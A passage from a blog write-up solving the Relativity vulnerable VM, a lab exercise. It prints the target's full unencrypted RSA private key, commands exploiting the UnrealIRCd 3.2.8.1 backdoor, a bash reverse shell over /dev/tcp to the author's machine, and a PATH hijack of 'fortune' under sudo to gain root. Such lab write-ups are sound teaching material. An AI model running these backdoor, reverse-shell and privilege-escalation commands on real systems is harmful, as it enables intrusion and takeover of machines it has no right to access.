+zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
+ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
+xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
+tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
+jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
+f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
+r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
+Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
+BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
+MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
+szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
+YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
++Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
+3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
+Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
+3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
+ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
+dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
+J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
+ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
+bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
+aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
+-----END RSA PRIVATE KEY-----
+</code></pre></div><p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># ssh mauk@192.168.56.21 -i key</span>
+<span style="color:#ff79c6">[</span>mauk@Relativity ~<span style="color:#ff79c6">]</span>$ id
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>mauk<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>mauk<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>mauk<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>mauk@Relativity ~<span style="color:#ff79c6">]</span>$
+</code></pre></div><p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>
+<h3 id="enumerating-the-next-step">enumerating the next step</h3>
+<p>Again, enumerate-&gt;exploit-&gt;post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>
+<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>mauk@Relativity ~<span style="color:#ff79c6">]</span>$ cat .bash_history
+
+ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
+su -
+<span style="color:#8be9fd;font-style:italic">exit</span>
+su -
+<span style="color:#ff79c6">[</span>mauk@Relativity ~<span style="color:#ff79c6">]</span>$
+</code></pre></div><p>The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: <code>ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key</code></p>
+<h3 id="good-ol-irc">good &lsquo;ol irc</h3>
+<p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Connecting…
+Connected
+*** Looking up your hostname...
+*** Couldn&#39;t resolve your hostname; using your IP address instead
+Logged in
+Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
+Your host is relativity.localdomain, running version Unreal3.2.8.1
+This server was created Thu Feb <span style="color:#bd93f9">28</span> <span style="color:#bd93f9">2013</span> at 17:54:35 EST
+relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
+UHNAMES NAMESX SAFELIST HCN <span style="color:#8be9fd;font-style:italic">MAXCHANNELS</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> <span style="color:#8be9fd;font-style:italic">CHANLIMIT</span><span style="color:#ff79c6">=</span><span style="color:#6272a4">#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server</span>
+WALLCHOPS <span style="color:#8be9fd;font-style:italic">WATCH</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">128</span> <span style="color:#8be9fd;font-style:italic">WATCHOPTS</span><span style="color:#ff79c6">=</span>A <span style="color:#8be9fd;font-style:italic">SILENCE</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">15</span> <span style="color:#8be9fd;font-style:italic">MODES</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">12</span> <span style="color:#8be9fd;font-style:italic">CHANTYPES</span><span style="color:#ff79c6">=</span><span style="color:#6272a4"># PREFIX=(qaohv)~&amp;@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&amp;@%+ are supported by this server</span>
+EXCEPTS INVEX <span style="color:#8be9fd;font-style:italic">CMDS</span><span style="color:#ff79c6">=</span>KNOCK,MAP,DCCALLOW,USERIP are supported by this server
+There are <span style="color:#bd93f9">1</span> users and <span style="color:#bd93f9">0</span> invisible on <span style="color:#bd93f9">1</span> servers
+I have <span style="color:#bd93f9">1</span> clients and <span style="color:#bd93f9">0</span> servers
+Current Local Users: <span style="color:#bd93f9">1</span>  Max: <span style="color:#bd93f9">1</span>
+Current Global Users: <span style="color:#bd93f9">1</span>  Max: <span style="color:#bd93f9">1</span>
+- relativity.localdomain Message of the Day -
+- 9/7/2013 9:17
+-     __________       .__          __  .__      .__  __
+-     <span style="color:#f1fa8c">\_</span>_____   <span style="color:#f1fa8c">\ </span>____ |  | _____ _/  |_|__|__  _|__|/  |_ ___.__.
+-      |       _// __ <span style="color:#f1fa8c">\|</span>  | <span style="color:#f1fa8c">\_</span>_  <span style="color:#f1fa8c">\\</span>   __<span style="color:#f1fa8c">\ </span> <span style="color:#f1fa8c">\ </span> <span style="color:#f1fa8c">\/</span> /  <span style="color:#f1fa8c">\ </span>  __&lt;   |  |
+-      |    |   <span style="color:#f1fa8c">\ </span> ___/|  |__/ __ <span style="color:#f1fa8c">\|</span>  | |  |<span style="color:#f1fa8c">\ </span>  /|  <span style="color:#ff79c6">||</span>  |  <span style="color:#f1fa8c">\_</span>__  |
+-      |____|_  /<span style="color:#f1fa8c">\_</span>__  &gt;____<span style="color:#ff79c6">(</span>____  /__| |__| <span style="color:#f1fa8c">\_</span>/ |__<span style="color:#ff79c6">||</span>__|  / ____| ·VM·
+-             <span style="color:#f1fa8c">\/</span>     <span style="color:#f1fa8c">\/</span>          <span style="color:#f1fa8c">\/</span>                        <span style="color:#f1fa8c">\/</span>
+End of /MOTD command.
+</code></pre></div><p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href="http://www.unrealircd.com/">UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution - Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>
+<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>
+<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>
+<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>
+<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># echo &#34;AB; ls -lah /home/ &gt; /tmp/1&#34; | nc 127.0.0.1 6667</span>
+:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
+:relativity.localdomain NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead
+:relativity.localdomain <span style="color:#bd93f9">451</span> AB; :You have not registered
+^C
+</code></pre></div><p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mauk@Relativity ~<span style="color:#ff79c6">]</span>$ cat /tmp/1
+total 16K
+drwxr-xr-x.  <span style="color:#bd93f9">4</span> root  root  4.0K Feb <span style="color:#bd93f9">25</span>  <span style="color:#bd93f9">2013</span> .
+dr-xr-xr-x. <span style="color:#bd93f9">18</span> root  root  4.0K Feb <span style="color:#bd93f9">28</span>  <span style="color:#bd93f9">2013</span> ..
+drwx------.  <span style="color:#bd93f9">4</span> jetta jetta 4.0K Sep <span style="color:#bd93f9">28</span> 10:03 jetta
+drwxr-xr-x.  <span style="color:#bd93f9">3</span> mauk  mauk  4.0K Jul  <span style="color:#bd93f9">9</span> 08:55 mauk
+</code></pre></div><p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo &quot;AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1&quot; | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># nc -vnlp 6676</span>
+listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">6676</span> ...
+connect to <span style="color:#ff79c6">[</span>&lt;snip&gt;<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.56.21<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">53493</span>
+bash: no job control in this shell
+<span style="color:#ff79c6">[</span>jetta@Relativity Unreal<span style="color:#ff79c6">]</span>$
+</code></pre></div><p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>jetta@Relativity ~<span style="color:#ff79c6">]</span>$ ls -lah auth_server/auth_server
+ls -lah auth_server/auth_server
+-rwxr-xr-x <span style="color:#bd93f9">1</span> root root 7.9K Mar  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2013</span> auth_server/auth_server
+<span style="color:#ff79c6">[</span>jetta@Relativity ~<span style="color:#ff79c6">]</span>$ auth_server/auth_server
+auth_server/auth_server
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Checking Certificates...done
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Contacting server, please wait...- ____________________________
+/ Windows <span style="color:#bd93f9">2000</span> is out!       <span style="color:#f1fa8c">\
+</span><span style="color:#f1fa8c"></span>|                            |
+<span style="color:#f1fa8c">\ </span>-- PC Magazine, April <span style="color:#bd93f9">2013</span> /
+ ----------------------------
+        <span style="color:#f1fa8c">\ </span>  ^__^
+         <span style="color:#f1fa8c">\ </span> <span style="color:#ff79c6">(</span>oo<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">\_</span>______
+            <span style="color:#ff79c6">(</span>__<span style="color:#ff79c6">)</span><span style="color:#f1fa8c">\ </span>      <span style="color:#ff79c6">)</span><span style="color:#f1fa8c">\/\
+</span><span style="color:#f1fa8c"></span>                <span style="color:#ff79c6">||</span>----w |
+                <span style="color:#ff79c6">||</span>     <span style="color:#ff79c6">||</span>
+could not establish connection
+error: <span style="color:#ff79c6">(</span>12<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>jetta@Relativity ~<span style="color:#ff79c6">]</span>$
+</code></pre></div><p>Right&hellip; well that is not exactly very helpful&hellip; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum-&gt;sploit-&gt;post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&hellip;</p>
+<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>
+<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>
+<h3 id="the-shortest-straw">the shortest straw</h3>
+<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># strings auth_server</span>
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+fflush
+puts
+putchar
+<span style="color:#8be9fd;font-style:italic">printf</span>
+poll
+stdout
+system
+__libc_start_main
+GLIBC_2.2.5
+l$ L
+t<span style="color:#ff79c6">$(</span>L
+|<span style="color:#8be9fd;font-style:italic">$0</span>H
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Checking Certificates...
+<span style="color:#ff79c6">done</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Contacting server, please wait...
+could not establish connection
+invalid certificates
+error: <span style="color:#ff79c6">(</span>12<span style="color:#ff79c6">)</span>
+fortune -s | /usr/bin/cowsay
+Starting Auth server..
+;*3$<span style="color:#f1fa8c">&#34;
+</span></code></pre></div><p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>jetta@Relativity ~<span style="color:#ff79c6">]</span>$ sudo -l
+sudo -l
+sudo: sorry, you must have a tty to run sudo
+<span style="color:#ff79c6">[</span>jetta@Relativity ~<span style="color:#ff79c6">]</span>$ python -c <span style="color:#f1fa8c">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;);&#34;</span>
+python -c <span style="color:#f1fa8c">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;);&#34;</span>
+sh-4.2$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#ff79c6">for</span> jetta on this host:
+    requiretty, <span style="color:#8be9fd;font-style:italic">env_keep</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+</span><span style="color:#f1fa8c">    LS_COLORS&#34;</span>, <span style="color:#8be9fd;font-style:italic">env_keep</span><span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+</span><span style="color:#f1fa8c">    LC_CTYPE&#34;</span>, <span style="color:#8be9fd;font-style:italic">env_keep</span><span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+</span><span style="color:#f1fa8c">    LC_MESSAGES&#34;</span>, <span style="color:#8be9fd;font-style:italic">env_keep</span><span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+</span><span style="color:#f1fa8c">    LC_TELEPHONE&#34;</span>, <span style="color:#8be9fd;font-style:italic">env_keep</span><span style="color:#ff79c6">+=</span><span style="color:#f1fa8c">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+</span><span style="color:#f1fa8c">    XAUTHORITY PATH&#34;</span>, env_reset
+
+User jetta may run the following commands on this host:
+    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /home/jetta/auth_server/auth_serveyr
+sh-4.2$
+</code></pre></div><p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>
+<p>&hellip; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>
+<h3 id="finishing-off">finishing off</h3>
+<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>
+<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#f1fa8c">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;);&#34;</span>
+sh-4.2$ <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">PATH</span><span style="color:#ff79c6">=</span>/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+&lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+sh-4.2$ sudo auth_server/auth_server
+sudo auth_server/auth_server
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Checking Certificates...done
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Contacting server, please wait...could not establish connection
+error: <span style="color:#ff79c6">(</span>12<span style="color:#ff79c6">)</span>
+</code></pre></div><p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># nc -lvp 6677</span>
+listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">6677</span> ...
+192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
+connect to <span style="color:#ff79c6">[</span>&lt;snip&gt;<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.56.21<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">38267</span>
+<span style="color:#ff79c6">[</span>root@Relativity jetta<span style="color:#ff79c6">]</span><span style="color:#6272a4"># id</span>
+id
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">[</span>root@Relativity jetta<span style="color:#ff79c6">]</span><span style="color:#6272a4"># locate flag.txt</span>
+locate flag.txt
+/root/flag.txt
+<span style="color:#ff79c6">[</span>root@Relativity jetta<span style="color:#ff79c6">]</span><span style="color:#6272a4"># cat /root/flag.txt</span>
+cat /root/flag.txt
+65afa0e5928b98f7ae283e16df2d43bf
+<span style="color:#ff79c6">[</span>root@Relativity jetta<span style="color:#ff79c6">]</span><span style="color:#6272a4">#</span>
+</code></pre></div><p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+  
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+          <script type="text/javascript">
+          
+          (function() {
+              
+              
+              
+              
+          
+              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+              var disqus_shortname = 'slashnote';
+              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </div>
+
+  
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foreword">foreword</a>
+      <ul>
+        <li><a href="#the-challenge">the challenge</a></li>
+        <li><a href="#initial-enumeration">initial enumeration</a>
+          <ul>
+            <li><a href="#putting-the-enumeration-together">putting the enumeration together</a></li>
+          </ul>
+        </li>
+        <li><a href="#the-initial-attack">the initial attack</a></li>
+        <li><a href="#web-based-attack">web based attack</a></li>
+        <li><a href="#exploiting-the-web-based-vulnerability">exploiting the web based vulnerability</a></li>
+        <li><a href="#gaining-further-access">gaining further access</a></li>
+        <li><a href="#enumerating-the-next-step">enumerating the next step</a></li>
+        <li><a href="#good-ol-irc">good &lsquo;ol irc</a></li>
+        <li><a href="#the-shortest-straw">the shortest straw</a></li>
+        <li><a href="#finishing-off">finishing off</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&text=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&is_video=false&description=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-11-18-slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm%2f&title=slash%20root%20slash%20flag%20dot%20txt%20Solving%20the%20Relativity%20Vulnerable%20VM">
+      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
